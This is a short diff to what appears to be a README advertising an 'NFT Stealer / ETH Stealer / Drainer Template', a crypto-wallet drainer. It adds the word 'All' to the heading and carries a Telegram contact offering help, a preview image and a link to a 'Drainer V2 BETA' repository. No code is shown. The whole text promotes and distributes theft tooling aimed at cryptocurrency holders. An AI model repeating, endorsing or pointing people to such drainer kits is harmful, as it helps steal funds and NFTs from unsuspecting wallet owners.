@@ -2,7 +2,7 @@
 ### If you need any help, DM me here: [@Zentoh](https://t.me/zentoh) (new telegram)
 ### 
 
-## 🖼️ NFT Stealer / ETH Stealer / Drainer Template
+## 🖼️ All NFT Stealer / ETH Stealer / Drainer Template
 
 ![preview](https://cdn.discordapp.com/attachments/954051921709252641/971157628694700032/unknown.png) [Drainer V2 BETA](https://github.com/0x32Moon/Crypto-Nft-Drainer-V2)
 
